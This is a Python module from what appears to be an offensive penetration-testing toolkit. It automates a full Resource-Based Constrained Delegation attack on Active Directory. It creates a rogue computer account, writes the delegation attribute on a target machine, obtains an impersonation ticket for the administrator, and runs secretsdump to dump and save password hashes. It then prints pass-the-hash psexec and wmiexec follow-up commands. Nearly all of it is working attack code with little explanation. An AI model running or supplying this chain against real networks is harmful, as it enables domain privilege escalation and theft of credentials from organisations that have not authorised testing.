"""
RBCD Auto-Exploit Module
Automated Resource-Based Constrained Delegation exploitation chain:
1. Check MachineAccountQuota via LDAP
2. Add a computer account (impacket addcomputer)
3. Set msDS-AllowedToActOnBehalfOfOtherIdentity on target (rbcd write)
4. Request service ticket via S4U2Self + S4U2Proxy (getST with -impersonate)
5. Use ticket for authentication (secretsdump or psexec)
"""

import os
import re
import shlex
import string
import random
from typing import Optional, Tuple

from core.module_base import ModuleBase, ModuleType, Platform, find_tool


class RBCDAutoExploit(ModuleBase):
    """
    Resource-Based Constrained Delegation auto-exploit module.

    Performs the full RBCD attack chain: quota check, computer creation,
    RBCD delegation write, S4U ticket request, and final authentication.
    Supports full exploitation, pre-check only, and cleanup modes.
    """

    def __init__(self):
        super().__init__()
        self.name = "rbcd_auto"
        self.description = "RBCD auto-exploit: add computer, set delegation, impersonate admin"
        self.author = "UwU Toolkit"
        self.version = "1.0.0"
        self.module_type = ModuleType.AUXILIARY
        self.platform = Platform.WINDOWS
        self.tags = [
            "ad", "rbcd", "delegation", "kerberos", "privesc",
            "s4u", "computer", "impersonate", "attack",
        ]
        self.references = [
            "https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd",
            "https://attack.mitre.org/techniques/T1558/",
            "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation",
        ]
        self.opsec_rating = "medium"
        self.opsec_notes = "Creates a computer account and modifies AD object attributes (logged in DC event logs)"

        self.provides = ["credentials", "tickets"]
        self.consumes = ["credentials"]
        self.suggested_next = [
            ("ad/secretsdump", "DCSync with obtained ticket or hash"),
            ("ad/evil_winrm", "Remote shell with obtained credentials"),
        ]

        # Core options
        self.register_option("RHOSTS", "Domain Controller IP", required=True)
        self.register_option("DOMAIN", "Domain name (e.g., corp.local)", required=True)
        self.register_option("USER", "Domain username with write access to target", required=True)
        self.register_option("PASS", "Password for USER", required=True)
        self.register_option("TARGET", "Target computer to attack (e.g., DC01$)", required=True)

        # Attack options
        self.register_option("IMPERSONATE", "User to impersonate", default="administrator")
        self.register_option("COMPUTER_NAME", "Name for fake computer (auto-generated if empty)", default="")
        self.register_option("COMPUTER_PASS", "Password for fake computer (random if empty)", default="")
        self.register_option("SPN", "Target SPN format (e.g., cifs/DC01.corp.local)", default="")

        # Action control
        self.register_option("ACTION", "Action to perform",
                           default="full",
                           choices=["full", "check", "cleanup"])

        # Output
        self.register_option("OUTPUT_DIR", "Directory for output files (tickets, etc.)", default="/tmp/rbcd_auto")

        # Internal state
        self._computer_name = ""
        self._computer_pass = ""

    def _generate_computer_name(self) -> str:
        """Generate a random computer name."""
        suffix = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
        return f"RBCD{suffix}$"

    def _generate_password(self, length: int = 16) -> str:
        """Generate a random password."""
        chars = string.ascii_letters + string.digits + "!@#$%"
        return ''.join(random.choices(chars, k=length))

    def _step_check_quota(self, dc_ip: str, domain: str, user: str, password: str) -> Tuple[bool, int]:
        """Step 1: Check MachineAccountQuota via LDAP."""
        self.print_status("=" * 50)
        self.print_status("STEP 1: Checking MachineAccountQuota")
        self.print_status("=" * 50)

        base_dn = ",".join(f"DC={part}" for part in domain.split("."))
        cmd = (
            f"ldapsearch -x -H ldap://{dc_ip} -D '{user}@{domain}' -w '{password}' "
            f"-b '{base_dn}' '(objectClass=domain)' ms-DS-MachineAccountQuota"
        )

        ret, stdout, stderr = self.run_in_exegol(cmd, timeout=30)
        output = stdout + stderr

        quota = -1
        for line in output.split("\n"):
            if "ms-DS-MachineAccountQuota" in line or "ms-ds-machineaccountquota" in line.lower():
                match = re.search(r':\s*(\d+)', line)
                if match:
                    quota = int(match.group(1))

        if quota < 0:
            # Fallback: try with python-ldap via impacket-style approach
            cmd2 = (
                f"ldeep ldap -u '{user}' -p '{password}' -d '{domain}' -s ldap://{dc_ip} "
                f"search '(objectClass=domain)' ms-DS-MachineAccountQuota 2>/dev/null || "
                f"python3 -c \""
                f"import ldap3; "
                f"s=ldap3.Server('{dc_ip}'); "
                f"c=ldap3.Connection(s,'{user}@{domain}','{password}',auto_bind=True); "
                f"c.search('{base_dn}','(objectClass=domain)',attributes=['ms-DS-MachineAccountQuota']); "
                f"print(c.entries[0]['ms-DS-MachineAccountQuota'])\""
            )
            ret2, stdout2, stderr2 = self.run_in_exegol(cmd2, timeout=30)
            output2 = stdout2 + stderr2
            match2 = re.search(r'(\d+)', output2)
            if match2:
                quota = int(match2.group(1))

        if quota > 0:
            self.print_good(f"MachineAccountQuota = {quota} (can add computers)")
            return True, quota
        elif quota == 0:
            self.print_error(f"MachineAccountQuota = 0 (cannot add computers)")
            self.print_warning("You may need to use an existing compromised computer account instead")
            return False, quota
        else:
            self.print_warning("Could not determine MachineAccountQuota (may still work)")
            return True, quota

    def _step_add_computer(self, dc_ip: str, domain: str, user: str, password: str) -> bool:
        """Step 2: Add a computer account using impacket addcomputer."""
        self.print_line()
        self.print_status("=" * 50)
        self.print_status("STEP 2: Adding computer account")
        self.print_status("=" * 50)

        # Ensure computer name ends with $
        comp_name = self._computer_name
        if not comp_name.endswith("$"):
            comp_name_arg = comp_name + "$"
        else:
            comp_name_arg = comp_name

        cmd = (
            f"addcomputer.py "
            f"{shlex.quote(f'{domain}/{user}:{password}')} "
            f"-dc-ip {shlex.quote(dc_ip)} "
            f"-computer-name {shlex.quote(comp_name_arg)} "
            f"-computer-pass {shlex.quote(self._computer_pass)}"
        )

        safe_cmd = cmd.replace(password, "[HIDDEN]").replace(self._computer_pass, "[HIDDEN]")
        self.print_status(f"Running: {safe_cmd}")

        ret, stdout, stderr = self.run_in_exegol(cmd, timeout=60)
        output = stdout + stderr

        for line in output.split("\n"):
            line = line.strip()
            if not line:
                continue
            if "Successfully added" in line or "added machine account" in line.lower():
                self.print_good(f"  {line}")
            elif "already exists" in line.lower():
                self.print_warning(f"  {line}")
                self.print_warning("Computer already exists - attempting to continue")
                return True
            elif "[-]" in line or "error" in line.lower():
                self.print_error(f"  {line}")
            elif "[*]" in line:
                self.print_status(line.replace("[*]", "").strip())

        if "Successfully added" in output or "already exists" in output.lower():
            self.print_good(f"Computer account {self._computer_name} ready")
            return True

        self.print_error("Failed to add computer account")
        return False

    def _step_set_rbcd(self, dc_ip: str, domain: str, user: str, password: str, target: str) -> bool:
        """Step 3: Set msDS-AllowedToActOnBehalfOfOtherIdentity on target."""
        self.print_line()
        self.print_status("=" * 50)
        self.print_status("STEP 3: Setting RBCD delegation on target")
        self.print_status("=" * 50)

        comp_name = self._computer_name.rstrip("$")

        # Try rbcd.py first (impacket)
        cmd = (
            f"rbcd.py "
            f"{shlex.quote(f'{domain}/{user}:{password}')} "
            f"-dc-ip {shlex.quote(dc_ip)} "
            f"-delegate-from {shlex.quote(comp_name + '$')} "
            f"-delegate-to {shlex.quote(target)} "
            f"-action write"
        )

        safe_cmd = cmd.replace(password, "[HIDDEN]")
        self.print_status(f"Running: {safe_cmd}")

        ret, stdout, stderr = self.run_in_exegol(cmd, timeout=60)
        output = stdout + stderr

        success = False
        for line in output.split("\n"):
            line = line.strip()
            if not line:
                continue
            if "successfully" in line.lower() or "delegation right" in line.lower():
                self.print_good(f"  {line}")
                success = True
            elif "[-]" in line or "error" in line.lower():
                self.print_error(f"  {line}")
            elif "[*]" in line:
                self.print_status(line.replace("[*]", "").strip())

        if success:
            self.print_good(f"RBCD delegation set: {comp_name}$ -> {target}")
            return True

        # Fallback: try bloodyAD
        self.print_warning("rbcd.py failed, trying bloodyAD...")
        bloody_cmd = (
            f"bloodyAD -u {shlex.quote(user)} -p {shlex.quote(password)} "
            f"-d {shlex.quote(domain)} --host {shlex.quote(dc_ip)} "
            f"add rbcd {shlex.quote(target)} {shlex.quote(comp_name + '$')}"
        )
        ret2, stdout2, stderr2 = self.run_in_exegol(bloody_cmd, timeout=30)
        output2 = stdout2 + stderr2

        if "updated" in output2.lower() or ret2 == 0:
            self.print_good(f"RBCD delegation set via bloodyAD: {comp_name}$ -> {target}")
            return True

        self.print_error("Failed to set RBCD delegation")
        return False

    def _step_get_ticket(self, dc_ip: str, domain: str, target: str,
                         impersonate: str, spn: str) -> Tuple[bool, str]:
        """Step 4: Request service ticket via S4U2Self + S4U2Proxy."""
        self.print_line()
        self.print_status("=" * 50)
        self.print_status("STEP 4: Requesting service ticket (S4U2Self + S4U2Proxy)")
        self.print_status("=" * 50)

        comp_name = self._computer_name.rstrip("$")

        # Build SPN if not provided
        if not spn:
            # Strip trailing $ from target for FQDN construction
            target_clean = target.rstrip("$")
            spn = f"cifs/{target_clean}.{domain}"

        cmd = (
            f"getST.py "
            f"{shlex.quote(f'{domain}/{comp_name}$:{self._computer_pass}')} "
            f"-dc-ip {shlex.quote(dc_ip)} "
            f"-spn {shlex.quote(spn)} "
            f"-impersonate {shlex.quote(impersonate)}"
        )

        safe_cmd = cmd.replace(self._computer_pass, "[HIDDEN]")
        self.print_status(f"Running: {safe_cmd}")

        ret, stdout, stderr = self.run_in_exegol(cmd, timeout=120)
        output = stdout + stderr

        ccache_path = ""
        for line in output.split("\n"):
            line = line.strip()
            if not line:
                continue
            if "Saving ticket" in line or ".ccache" in line:
                self.print_good(f"  {line}")
                match = re.search(r'(\S+\.ccache)', line)
                if match:
                    ccache_path = match.group(1)
            elif "[-]" in line or "error" in line.lower():
                self.print_error(f"  {line}")
            elif "[*]" in line:
                self.print_status(line.replace("[*]", "").strip())
            elif "Getting TGT" in line or "Getting ST" in line:
                self.print_status(f"  {line}")

        if ccache_path:
            self.print_good(f"Service ticket saved to: {ccache_path}")
            return True, ccache_path

        # Try to find ccache in current directory
        for f in os.listdir("."):
            if f.endswith(".ccache") and impersonate.lower() in f.lower():
                self.print_good(f"Found ticket: {f}")
                return True, f

        self.print_error("Failed to obtain service ticket")
        return False, ""

    def _step_authenticate(self, dc_ip: str, domain: str, target: str,
                           ccache_path: str, impersonate: str) -> bool:
        """Step 5: Use ticket for authentication (secretsdump)."""
        self.print_line()
        self.print_status("=" * 50)
        self.print_status("STEP 5: Authenticating with service ticket")
        self.print_status("=" * 50)

        target_clean = target.rstrip("$")

        # Set KRB5CCNAME and run secretsdump
        cmd = (
            f"export KRB5CCNAME='{ccache_path}' && "
            f"secretsdump.py "
            f"-k -no-pass "
            f"-dc-ip {shlex.quote(dc_ip)} "
            f"{shlex.quote(f'{domain}/{impersonate}@{target_clean}.{domain}')}"
        )

        self.print_status(f"Running secretsdump with Kerberos ticket...")
        self.print_status(f"  KRB5CCNAME={ccache_path}")

        ret, stdout, stderr = self.run_in_exegol(cmd, timeout=180)
        output = stdout + stderr

        hashes_found = []
        for line in output.split("\n"):
            line = line.strip()
            if not line:
                continue
            # Look for hash lines (SAM, NTDS format)
            if ":::" in line and not line.startswith("["):
                hashes_found.append(line)
                if "administrator" in line.lower() or "500:" in line:
                    self.print_good(f"  {line}")
                else:
                    self.print_line(f"    {line}")
            elif "[-]" in line or "error" in line.lower():
                self.print_error(f"  {line}")
            elif "[*]" in line:
                self.print_status(line.replace("[*]", "").strip())

        if hashes_found:
            self.print_line()
            self.print_good("=" * 60)
            self.print_good(f"RBCD ATTACK SUCCESSFUL")
            self.print_good(f"  Impersonated: {impersonate}")
            self.print_good(f"  Target: {target}")
            self.print_good(f"  Hashes dumped: {len(hashes_found)}")
            self.print_good("=" * 60)

            # Save hashes
            output_dir = self.get_option("OUTPUT_DIR")
            hash_file = os.path.join(output_dir, f"rbcd_{target_clean}_hashes.txt")
            try:
                with open(hash_file, "w") as f:
                    f.write("\n".join(hashes_found))
                self.print_good(f"Hashes saved to: {hash_file}")
            except Exception as e:
                self.print_warning(f"Could not save hashes: {e}")

            self.print_line()
            self.print_status("Next steps:")
            admin_hash = ""
            for h in hashes_found:
                if "administrator" in h.lower() or ":500:" in h:
                    parts = h.split(":")
                    if len(parts) >= 4:
                        admin_hash = f"{parts[2]}:{parts[3]}"
                        break
            if admin_hash:
                self.print_status(f"  psexec.py {domain}/administrator@{target_clean} -hashes {admin_hash}")
                self.print_status(f"  wmiexec.py {domain}/administrator@{target_clean} -hashes {admin_hash}")
            else:
                self.print_status(f"  Use extracted hashes for pass-the-hash attacks")

            return True

        # If secretsdump failed with kerberos, try psexec to verify access
        self.print_warning("secretsdump did not return hashes, verifying ticket with psexec...")
        verify_cmd = (
            f"export KRB5CCNAME='{ccache_path}' && "
            f"psexec.py "
            f"-k -no-pass "
            f"-dc-ip {shlex.quote(dc_ip)} "
            f"{shlex.quote(f'{domain}/{impersonate}@{target_clean}.{domain}')} "
            f"'whoami'"
        )
        ret2, stdout2, stderr2 = self.run_in_exegol(verify_cmd, timeout=60)
        output2 = stdout2 + stderr2

        if "nt authority" in output2.lower() or impersonate.lower() in output2.lower():
            self.print_good(f"Ticket is valid! Got execution as: {output2.strip()}")
            self.print_status(f"Use: KRB5CCNAME={ccache_path} psexec.py -k -no-pass {domain}/{impersonate}@{target_clean}.{domain}")
            return True

        self.print_error("Could not verify ticket authentication")
        return False

    def _cleanup_rbcd(self, dc_ip: str, domain: str, user: str, password: str, target: str) -> None:
        """Remove RBCD delegation and delete added computer account."""
        self.print_line()
        self.print_status("=" * 50)
        self.print_status("CLEANUP: Removing RBCD delegation and computer account")
        self.print_status("=" * 50)

        comp_name = self._computer_name.rstrip("$")

        # Remove RBCD delegation
        self.print_status(f"Removing RBCD delegation from {target}...")
        cmd_remove = (
            f"rbcd.py "
            f"{shlex.quote(f'{domain}/{user}:{password}')} "
            f"-dc-ip {shlex.quote(dc_ip)} "
            f"-delegate-from {shlex.quote(comp_name + '$')} "
            f"-delegate-to {shlex.quote(target)} "
            f"-action remove"
        )
        ret, stdout, stderr = self.run_in_exegol(cmd_remove, timeout=30)
        output = stdout + stderr
        if "successfully" in output.lower() or ret == 0:
            self.print_good(f"  RBCD delegation removed from {target}")
        else:
            self.print_warning(f"  Could not remove RBCD delegation: {output.strip()}")
            # Try bloodyAD fallback
            bloody_cmd = (
                f"bloodyAD -u {shlex.quote(user)} -p {shlex.quote(password)} "
                f"-d {shlex.quote(domain)} --host {shlex.quote(dc_ip)} "
                f"remove rbcd {shlex.quote(target)} {shlex.quote(comp_name + '$')}"
            )
            ret2, stdout2, stderr2 = self.run_in_exegol(bloody_cmd, timeout=30)
            if "updated" in (stdout2 + stderr2).lower() or ret2 == 0:
                self.print_good(f"  RBCD delegation removed via bloodyAD")

        # Delete computer account
        self.print_status(f"Deleting computer account {comp_name}$...")
        cmd_delete = (
            f"addcomputer.py "
            f"{shlex.quote(f'{domain}/{user}:{password}')} "
            f"-dc-ip {shlex.quote(dc_ip)} "
            f"-computer-name {shlex.quote(comp_name + '$')} "
            f"-delete"
        )
        ret, stdout, stderr = self.run_in_exegol(cmd_delete, timeout=30)
        output = stdout + stderr
        if "successfully" in output.lower() or "deleted" in output.lower() or ret == 0:
            self.print_good(f"  Computer account {comp_name}$ deleted")
        else:
            self.print_warning(f"  Could not delete computer: {output.strip()}")
            self.print_status(f"  Manual cleanup: addcomputer.py '{domain}/{user}' -dc-ip {dc_ip} -computer-name {comp_name}$ -delete")

    def run(self) -> bool:
        dc_ip = self.get_option("RHOSTS")
        domain = self.get_option("DOMAIN")
        user = self.get_option("USER")
        password = self.get_option("PASS")
        target = self.get_option("TARGET")
        impersonate = self.get_option("IMPERSONATE")
        action = self.get_option("ACTION")
        spn = self.get_option("SPN")
        output_dir = self.get_option("OUTPUT_DIR")

        # Set up computer name and password
        self._computer_name = self.get_option("COMPUTER_NAME") or self._generate_computer_name()
        self._computer_pass = self.get_option("COMPUTER_PASS") or self._generate_password()

        self.print_line()
        self.print_status(f"RBCD Auto-Exploit v{self.version}")
        self.print_status(f"DC: {dc_ip} | Domain: {domain}")
        self.print_status(f"User: {user} | Target: {target}")
        self.print_status(f"Impersonate: {impersonate}")
        self.print_status(f"Computer: {self._computer_name} | Action: {action}")
        self.print_line()

        # Ensure output directory
        os.makedirs(output_dir, exist_ok=True)
        orig_dir = os.getcwd()
        os.chdir(output_dir)

        try:
            if action == "cleanup":
                self._cleanup_rbcd(dc_ip, domain, user, password, target)
                return True

            # Step 1: Check MachineAccountQuota
            quota_ok, quota = self._step_check_quota(dc_ip, domain, user, password)

            if action == "check":
                self.print_line()
                if quota_ok:
                    self.print_good(f"Pre-check passed. MachineAccountQuota = {quota}")
                    self.print_status("Set ACTION=full to run the full exploit chain")
                else:
                    self.print_error("Pre-check failed. Cannot add computer accounts.")
                return quota_ok

            if not quota_ok:
                self.print_warning("Quota check failed but continuing anyway...")

            # Step 2: Add computer account
            if not self._step_add_computer(dc_ip, domain, user, password):
                return False

            # Step 3: Set RBCD delegation
            if not self._step_set_rbcd(dc_ip, domain, user, password, target):
                self.print_error("RBCD delegation failed - cleaning up...")
                self._cleanup_rbcd(dc_ip, domain, user, password, target)
                return False

            # Step 4: Request service ticket
            ok, ccache = self._step_get_ticket(dc_ip, domain, target, impersonate, spn)
            if not ok:
                self.print_error("Ticket request failed - cleaning up...")
                self._cleanup_rbcd(dc_ip, domain, user, password, target)
                return False

            # Step 5: Authenticate with ticket
            success = self._step_authenticate(dc_ip, domain, target, ccache, impersonate)

            if success:
                self.print_line()
                self.print_warning("Remember to clean up: set ACTION cleanup and run again")
                self.print_status(f"  Computer account: {self._computer_name}")
                self.print_status(f"  RBCD delegation on: {target}")

            return success

        finally:
            os.chdir(orig_dir)

    def check(self) -> bool:
        """Check if required tools are available."""
        tools = ["addcomputer.py", "rbcd.py", "getST.py", "secretsdump.py"]
        self.print_status("Checking for required impacket tools...")

        for tool in tools:
            ret, stdout, stderr = self.run_in_exegol(f"which {tool}", timeout=10)
            if ret == 0:
                self.print_good(f"  {tool}: found")
            else:
                self.print_warning(f"  {tool}: not found (may still work via PATH)")

        return True


module = RBCDAutoExploit()
